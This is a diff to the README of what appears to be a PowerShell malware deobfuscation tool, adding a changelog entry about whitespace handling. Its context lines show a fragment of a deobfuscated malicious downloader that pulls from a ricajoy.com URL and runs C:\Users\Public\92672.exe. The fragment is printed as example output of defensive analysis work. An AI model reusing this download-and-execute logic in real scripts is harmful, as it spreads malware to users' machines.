@@ -65,6 +65,8 @@ ricajoy.com/wef346645'.Split(',');$karapas = $nsadasd.next(1, 343245);$huas = $e
 4. [Invoke-Item] Execute/Open: C:\Users\Public\92672.exe
 ```
 # Change Log
+* 2018.06.05
+  * Updated script to properly handle the presence of whitespace characters wrapped in quotes.
 * 2018.05.30
   * Added better handling of double quotes during script building to eliminate hard failure.
   * Implemented replace function to replace the string concatenation '+' that could be found within a malicious script with an empty string. Eliminates simple obfuscation in layer output.
